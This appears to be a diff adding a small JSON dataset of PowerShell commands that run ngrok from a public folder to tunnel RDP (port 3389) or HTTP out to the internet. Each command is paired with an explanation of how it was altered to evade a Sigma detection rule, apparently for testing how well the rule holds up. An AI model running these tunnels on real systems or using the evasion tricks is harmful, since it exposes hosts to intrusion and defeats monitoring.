@@ -1,0 +1,14 @@
+[
+  {
+    "output": "powershell.exe & {C:\\Users\\Public\\ngrok\\ngrok.exe config add-authtoken N\\A | Out-Null Start-Job -ScriptBlock { C:\\Users\\Public\\ngrok\\ngrok.exe tcp 3389 } | Out-Null Start-Sleep -s 5 Stop-Job -Name Job1 | Out-Null}",
+    "explanation": "Insertion: Added escape characters to the 'N/A' token to avoid matching the 'authtoken' keyword in the Sigma rule."
+  },
+  {
+    "output": "powershell.exe & {C:\\Users\\Public\\ngrok\\ngrok.exe config add-authtoken N\\A | Out-Null Start-Job -ScriptBlock { C:\\Users\\Public\\ngrok\\ngrok.exe http 80 } | Out-Null Start-Sleep -s 5 Stop-Job -Name Job1 | Out-Null}",
+    "explanation": "Substitution: Changed 'tcp 3389' to 'http 80' to avoid the 'tcp' keyword in the Sigma rule while maintaining the same executable family and benign test intent."
+  },
+  {
+    "output": "powershell.exe & {C:\\Users\\Public\\ngrok\\ngrok.exe config add-authtoken N\\A | Out-Null Start-Job -ScriptBlock { C:\\Users\\Public\\ngrok\\ngrok.exe --all } | Out-Null Start-Sleep -s 5 Stop-Job -Name Job1 | Out-Null}",
+    "explanation": "Omission: Removed the 'tcp' keyword by using the '--all' flag, which avoids the 'tcp' keyword in the Sigma rule while maintaining the same executable family and benign test intent."
+  }
+]
